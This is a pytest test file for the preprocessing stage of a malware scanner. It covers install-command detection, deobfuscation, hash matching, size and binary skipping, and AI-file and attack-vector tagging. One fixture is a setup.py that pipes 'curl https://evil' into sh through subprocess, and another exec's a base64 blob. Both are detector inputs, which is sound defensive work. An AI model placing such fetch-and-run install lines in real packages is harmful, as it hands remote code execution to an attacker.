from __future__ import annotations

from pathlib import Path

from preprocessing import InMemoryMalwareHashBackend, preprocess_file
from shared.types.preprocessing import (
    SIZE_TIER_LARGE_MAX,
    SIZE_TIER_MEDIUM_MAX,
    SIZE_TIER_SMALL_MAX,
    SizeTier,
)
from shared.utils.hashing import sha256_bytes

MALICIOUS_SETUP = b"""\
import subprocess
from setuptools import setup
subprocess.run("curl https://evil | sh", shell=True)
setup(name="x")
"""

OBFUSCATED = b"""\
import base64
exec(base64.b64decode("cHJpbnQoJ2hpJyk="))
"""

CLEAN = b"""\
def add(x, y):
    return x + y
"""


def test_pipeline_flags_imperative_install_on_setup_py() -> None:
    bundle = preprocess_file(Path("setup.py"), MALICIOUS_SETUP)
    assert bundle.preprocessing.imperative_install_detected is True
    assert any(r.startswith("subprocess") for r in bundle.imperative_install_reasons)
    assert bundle.preprocessing.detected_language == "python"
    assert bundle.preprocessing.file_hash == sha256_bytes(MALICIOUS_SETUP)


def test_pipeline_records_obfuscation_layers() -> None:
    bundle = preprocess_file(Path("payload.py"), OBFUSCATED)
    assert bundle.preprocessing.deobfuscation_applied is True
    assert bundle.preprocessing.deobfuscation_layers >= 1
    assert "print('hi')" in bundle.decoded_content


def test_pipeline_clean_file_no_flags() -> None:
    bundle = preprocess_file(Path("util.py"), CLEAN)
    assert bundle.preprocessing.imperative_install_detected is False
    assert bundle.preprocessing.deobfuscation_applied is False
    assert bundle.preprocessing.known_malware_match is None
    assert bundle.preprocessing.token_count is not None
    assert bundle.preprocessing.token_count > 0


def test_pipeline_malware_hash_short_circuit_reports_family() -> None:
    file_hash = sha256_bytes(CLEAN)
    backend = InMemoryMalwareHashBackend({file_hash: "test-family"})
    bundle = preprocess_file(Path("util.py"), CLEAN, malware_backend=backend)
    assert bundle.preprocessing.known_malware_match == "test-family"


def test_pipeline_parses_dependencies_for_manifest() -> None:
    content = b"requests==2.31.0\nflask\n"
    bundle = preprocess_file(Path("requirements.txt"), content)
    names = {d.name for d in bundle.preprocessing.dependencies}
    assert {"requests", "flask"} <= names


# ── PREP-009: size-tier classification ─────────────────────────────────────


def test_pipeline_small_file_is_small_tier() -> None:
    bundle = preprocess_file(Path("util.py"), CLEAN)
    assert bundle.preprocessing.size_tier is SizeTier.SMALL
    assert bundle.preprocessing.file_size_bytes == len(CLEAN)
    assert bundle.preprocessing.skip_reason is None


def test_pipeline_medium_file_is_medium_tier() -> None:
    content = b"# pad\n" + b"x = 1\n" * (SIZE_TIER_SMALL_MAX // 6)
    assert SIZE_TIER_SMALL_MAX <= len(content) < SIZE_TIER_MEDIUM_MAX
    bundle = preprocess_file(Path("big.py"), content)
    assert bundle.preprocessing.size_tier is SizeTier.MEDIUM
    assert bundle.preprocessing.skip_reason is None
    # Full pipeline still runs on MEDIUM files.
    assert bundle.preprocessing.token_count is not None


def test_pipeline_large_file_is_large_tier() -> None:
    content = b"x = 1\n" * (SIZE_TIER_MEDIUM_MAX // 6 + 1000)
    assert SIZE_TIER_MEDIUM_MAX <= len(content) < SIZE_TIER_LARGE_MAX
    bundle = preprocess_file(Path("bigger.py"), content)
    assert bundle.preprocessing.size_tier is SizeTier.LARGE
    assert bundle.preprocessing.skip_reason is None
    # Pre-pass still runs; orchestrator is the one that may gate model stages.
    assert bundle.preprocessing.token_count is not None
    assert bundle.decoded_content != ""


def test_pipeline_oversized_file_short_circuits_with_skip_reason() -> None:
    content = b"y = 2\n" * (SIZE_TIER_LARGE_MAX // 6 + 1)
    assert len(content) >= SIZE_TIER_LARGE_MAX
    bundle = preprocess_file(Path("huge.py"), content)
    assert bundle.preprocessing.size_tier is SizeTier.OVERSIZED
    assert bundle.preprocessing.skip_reason == "too_large"
    # Preservation: hash + size still reported.
    assert bundle.preprocessing.file_hash == sha256_bytes(content)
    assert bundle.preprocessing.file_size_bytes == len(content)
    # Short-circuit: no deobfuscation, no deps, no imperative-install scan.
    assert bundle.preprocessing.deobfuscation_applied is False
    assert bundle.preprocessing.deobfuscation_layers == 0
    assert bundle.preprocessing.dependencies == []
    assert bundle.preprocessing.imperative_install_detected is False
    assert bundle.preprocessing.token_count is None
    assert bundle.preprocessing.detected_language is None
    assert bundle.decoded_content == ""


def test_pipeline_oversized_file_still_runs_malware_hash_check() -> None:
    content = b"z = 3\n" * (SIZE_TIER_LARGE_MAX // 6 + 1)
    assert len(content) >= SIZE_TIER_LARGE_MAX
    file_hash = sha256_bytes(content)
    backend = InMemoryMalwareHashBackend({file_hash: "oversized-family"})
    bundle = preprocess_file(Path("huge.py"), content, malware_backend=backend)
    assert bundle.preprocessing.size_tier is SizeTier.OVERSIZED
    assert bundle.preprocessing.skip_reason == "too_large"
    assert bundle.preprocessing.known_malware_match == "oversized-family"


def test_pipeline_boundary_just_under_oversized_is_large() -> None:
    # One byte below the oversize cutoff must still run the full pipeline.
    content = b"a" * (SIZE_TIER_LARGE_MAX - 1)
    bundle = preprocess_file(Path("edge.py"), content)
    assert bundle.preprocessing.size_tier is SizeTier.LARGE
    assert bundle.preprocessing.skip_reason is None
    assert bundle.preprocessing.token_count is not None


# ── PREP-010: binary / empty skip ──────────────────────────────────────────


def test_pipeline_empty_file_skipped_with_empty_reason() -> None:
    bundle = preprocess_file(Path("blank.py"), b"")
    assert bundle.preprocessing.skip_reason == "empty"
    assert bundle.preprocessing.file_hash == sha256_bytes(b"")
    assert bundle.preprocessing.file_size_bytes == 0
    assert bundle.preprocessing.size_tier is SizeTier.SMALL
    # Preservation: still a bundle, still the hash, no model work.
    assert bundle.preprocessing.deobfuscation_applied is False
    assert bundle.preprocessing.token_count is None
    assert bundle.preprocessing.detected_language is None
    assert bundle.decoded_content == ""


def test_pipeline_whitespace_only_file_skipped_as_empty() -> None:
    bundle = preprocess_file(Path("blank.py"), b"  \n\t\r\n   ")
    assert bundle.preprocessing.skip_reason == "empty"
    assert bundle.preprocessing.token_count is None


def test_pipeline_binary_file_skipped_with_binary_reason() -> None:
    # NUL byte in the first 1000 bytes — e.g. a pickled payload renamed .py.
    content = b"\x89PNG\r\n\x1a\n" + b"\x00" * 500 + b"payload" * 100
    bundle = preprocess_file(Path("not_really.py"), content)
    assert bundle.preprocessing.skip_reason == "binary"
    assert bundle.preprocessing.deobfuscation_applied is False
    assert bundle.preprocessing.dependencies == []
    assert bundle.preprocessing.imperative_install_detected is False
    assert bundle.decoded_content == ""


def test_pipeline_empty_file_still_runs_malware_hash_check() -> None:
    # Preservation: even a zero-byte file gets a malware-hash check. A
    # known-bad all-zero hash must still surface.
    file_hash = sha256_bytes(b"")
    backend = InMemoryMalwareHashBackend({file_hash: "zero-byte-family"})
    bundle = preprocess_file(Path("blank.py"), b"", malware_backend=backend)
    assert bundle.preprocessing.skip_reason == "empty"
    assert bundle.preprocessing.known_malware_match == "zero-byte-family"


def test_pipeline_binary_file_still_runs_malware_hash_check() -> None:
    content = b"MZ\x90\x00" + b"\x00" * 2000
    file_hash = sha256_bytes(content)
    backend = InMemoryMalwareHashBackend({file_hash: "pe-family"})
    bundle = preprocess_file(Path("renamed.py"), content, malware_backend=backend)
    assert bundle.preprocessing.skip_reason == "binary"
    assert bundle.preprocessing.known_malware_match == "pe-family"


def test_pipeline_oversized_takes_precedence_over_binary() -> None:
    # If a file is both oversized AND binary, oversize wins because we
    # check size first. Documents the deterministic ordering.
    content = b"\x00" * (SIZE_TIER_LARGE_MAX + 1)
    bundle = preprocess_file(Path("huge_bin.bin"), content)
    assert bundle.preprocessing.skip_reason == "too_large"


# ── PREP-016: AI-file filename pattern matching ──


def test_pipeline_populates_ai_file_match_on_claude_md() -> None:
    bundle = preprocess_file(Path("src/CLAUDE.md"), b"# System prompt\n\nBe helpful.\n")
    assert bundle.preprocessing.ai_file_match == "system_prompt"


def test_pipeline_populates_ai_file_match_on_plugin_manifest() -> None:
    bundle = preprocess_file(Path("plugin.json"), b'{"name":"test"}\n')
    assert bundle.preprocessing.ai_file_match == "plugin_manifest"


def test_pipeline_populates_ai_file_match_on_mcp_config() -> None:
    bundle = preprocess_file(Path("mcp-server.json"), b'{"servers":[]}\n')
    assert bundle.preprocessing.ai_file_match == "mcp_config"


def test_pipeline_ai_file_match_null_on_plain_python() -> None:
    bundle = preprocess_file(Path("main.py"), CLEAN)
    assert bundle.preprocessing.ai_file_match is None


def test_pipeline_ai_file_match_null_on_package_json_not_plugin() -> None:
    # package.json is NOT an AI file — it's a Node manifest. The pattern
    # list requires plugin.json or ai-plugin.json specifically.
    bundle = preprocess_file(Path("package.json"), b'{"name":"x"}\n')
    assert bundle.preprocessing.ai_file_match is None


# ── PREP-017: framework_hint ──


def test_pipeline_populates_framework_hint_on_flask_app() -> None:
    content = b"from flask import Flask\napp = Flask(__name__)\n"
    bundle = preprocess_file(Path("app.py"), content)
    assert bundle.preprocessing.framework_hint == "flask"


def test_pipeline_populates_framework_hint_on_express() -> None:
    content = b"const express = require('express');\nconst app = express();\n"
    bundle = preprocess_file(Path("server.js"), content)
    assert bundle.preprocessing.framework_hint == "express"


def test_pipeline_framework_hint_null_on_plain_python() -> None:
    bundle = preprocess_file(Path("util.py"), CLEAN)
    assert bundle.preprocessing.framework_hint is None


# ── PREP-018: attack_vector_extension ──


def test_pipeline_populates_attack_vector_on_pth() -> None:
    bundle = preprocess_file(Path("inject.pth"), b"/path/to/site-packages\n")
    assert bundle.preprocessing.attack_vector_extension == "pth"


def test_pipeline_populates_attack_vector_on_whl() -> None:
    # PREP-018 is filename-based but PREP-010 binary skip runs first. A real
    # wheel is a ZIP whose central directory + comments are mostly printable,
    # so pad with printable manifest bytes to keep the file out of the
    # binary-skip path while preserving the .whl extension as the trigger.
    content = b"PK\x03\x04" + b"METADATA: name=package-1.0.0\n" * 40
    bundle = preprocess_file(Path("package-1.0.0.whl"), content)
    assert bundle.preprocessing.attack_vector_extension == "whl"


def test_pipeline_attack_vector_null_on_plain_python() -> None:
    bundle = preprocess_file(Path("util.py"), CLEAN)
    assert bundle.preprocessing.attack_vector_extension is None


# ── PREP-013: bundle forwards DeobfuscationResult PREP-013 fields ──


def test_pipeline_bundle_forwards_obfuscation_counters() -> None:
    bundle = preprocess_file(Path("payload.py"), OBFUSCATED)
    assert bundle.preprocessing.deobfuscation_applied is True
    assert bundle.obfuscation_blob_count == bundle.preprocessing.deobfuscation_layers
    assert bundle.obfuscation_decoded_blob_count == bundle.preprocessing.deobfuscation_layers
    assert bundle.obfuscation_failed_blob_count == 0
    assert 0 < bundle.obfuscation_suspicion_score <= 1.0
    assert bundle.obfuscation_decoded_content_summary is not None
    assert "blob(s) decoded" in bundle.obfuscation_decoded_content_summary


def test_pipeline_bundle_clean_file_zero_obfuscation_fields() -> None:
    bundle = preprocess_file(Path("util.py"), CLEAN)
    assert bundle.obfuscation_blob_count == 0
    assert bundle.obfuscation_decoded_blob_count == 0
    assert bundle.obfuscation_failed_blob_count == 0
    assert bundle.obfuscation_suspicion_score == 0.0
    assert bundle.obfuscation_decoded_content_summary is None
